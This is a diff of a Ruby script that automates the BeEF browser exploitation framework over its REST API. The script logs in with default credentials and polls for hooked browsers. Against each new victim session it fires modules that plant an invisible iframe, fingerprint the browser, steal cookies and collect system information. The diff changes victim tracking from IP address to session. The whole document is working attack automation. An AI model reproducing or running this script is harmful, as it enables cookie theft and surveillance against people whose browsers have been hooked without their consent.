@@ -33,13 +33,10 @@ BEEF_USER = "beef"
 BEEF_PASSWD = "beef"
 
 @autorun_mods = [
-	{ 'Invisible_iframe' => {'target' => 'http://192.168.50.52/' }},
+  { 'Invisible_iframe' => {'target' => 'http://192.168.50.52/' }},
   { 'Browser_fingerprinting' => {}},
   { 'Get_cookie' => {}},
-  { 'Get_system_info' => {}}
-  
-	]
-@ses_cache = {}
+  { 'Get_system_info' => {}}]
 
 def login
 	response = RestClient.post "#{RESTAPI_ADMIN}/login",
@@ -54,11 +51,6 @@ def get_alive
   response = RestClient.get "#{RESTAPI_HOOKS}", {:params => {:token => @token}}
   result = JSON.parse(response.body)
   @hooks = result["hooked-browsers"]["online"]
-  @alive_ips = []
-  @hooks.each do |hook|
-	@alive_ips << hook[1]['ip']
-	@ses_cache[hook[1]['ip']] = hook[1]['session']
-  end
 end
 
 def get_mod_cache
@@ -85,21 +77,22 @@ end
 
 login
 get_mod_cache
-processed_ips = []
+processed_sessions = []
 while true do 
 	get_alive
-	@alive_ips.each do |ip|
-		next if processed_ips.include? ip
-		print "[*] Running autorun mods against #{ip}\n"
+    @hooks.each do |hook|
+        ip = hook[1]['ip']
+        session = hook[1]['session']
+		next if processed_sessions.include? session
+		print "[*] Running autorun mods against #{ip}:#{session}\n"
 		@autorun_mods.each do |modinfo|
 			modinfo.each do |mod,opts|
 				mid = @mod_cache[mod][:id]
-				ses = @ses_cache[ip]
-				res = send_mod(mid,ses,opts)
+				res = send_mod(mid,session,opts)
         print res.to_json + "\n"
 			end
 		end
-		processed_ips << ip
+		processed_sessions << session
 	end
 	sleep 5
 
